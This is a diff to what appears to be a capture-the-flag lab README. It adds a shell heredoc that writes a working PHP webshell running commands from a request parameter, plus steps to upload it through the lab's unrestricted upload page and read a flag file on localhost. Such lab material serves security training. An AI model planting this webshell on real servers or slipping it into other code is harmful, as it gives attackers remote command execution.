@@ -5,6 +5,15 @@ the app's upload vulnerability, which is the point. Your RCE flag file is named 
 player key (shown in the console), so it is unique to you.
 
 ## Webshell (shell.php)
+`shell.php` is **not committed to the repo**: Windows antivirus strips classic webshells before
+they can be staged. Create it once on the Linux host (your own lab target, nothing to evade):
+```bash
+cat > payloads/shell.php <<'PHP'
+<?php if (isset($_REQUEST['cmd'])) { echo "<pre>"; system($_REQUEST['cmd']); echo "</pre>"; }
+else { echo "usage: ?cmd=<command>"; }
+PHP
+```
+Then:
 1. Enlist in the console, hit **Launch target** (this sets your player key cookie).
 2. Open **Upload a profile photo** (`/upload.php`), upload `shell.php` (any extension is accepted).
 3. Browse to `http://127.0.0.1:8080/uploads/shell.php?cmd=cat /var/flags/<YOUR_PLAYER_KEY>.flag`.
